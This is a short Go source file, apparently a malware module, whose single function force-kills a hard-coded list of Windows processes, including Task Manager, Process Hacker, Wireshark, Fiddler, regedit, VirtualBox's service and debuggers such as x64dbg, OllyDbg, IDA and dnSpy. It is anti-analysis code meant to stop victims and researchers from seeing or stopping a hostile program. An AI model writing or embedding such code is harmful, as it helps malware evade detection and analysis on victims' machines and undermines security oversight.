package KillBadProcesses

import (
	"os/exec"
)

func KillProcesses() {
	ptk := []string{
		"taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe",
		"httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe",
		"regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe",
		"DbgX.Shell.exe", "ILSpy.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "gdb.exe",
		"idaq.exe", "idag.exe", "idaw.exe", "ida64.exe", "idag64.exe", "idaw64.exe",
		"idaq64.exe", "windbg.exe", "ollydbg.exe", "immunitydebugger.exe", "windasm.exe",
	}

	for _, prg := range ptk {
		exec.Command("taskkill", "/F", "/IM", prg).Run()
	}
}
